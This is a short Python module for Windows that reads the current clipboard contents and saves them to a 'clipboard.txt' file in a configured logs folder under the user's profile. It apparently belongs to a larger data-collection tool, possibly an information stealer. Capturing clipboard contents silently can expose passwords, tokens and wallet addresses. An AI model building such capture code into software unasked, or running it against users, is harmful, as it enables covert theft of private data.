
from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
from os import environ
from manager.logger import Log
from preferences.config import config

def ClipBoard():
    user = environ['USERPROFILE']
    pathToLogs = f'{user}\\{config.pathToLogs}\\System'
    try:
        OpenClipboard()
        data = GetClipboardData()
    except Exception as e:
        Log(f"ClipBoard ---> {e}")
        data =  "none"
        
    finally:
        CloseClipboard()
        with open(pathToLogs+"\\clipboard.txt", 'w', encoding='UTF-8') as f:
            f.write(data)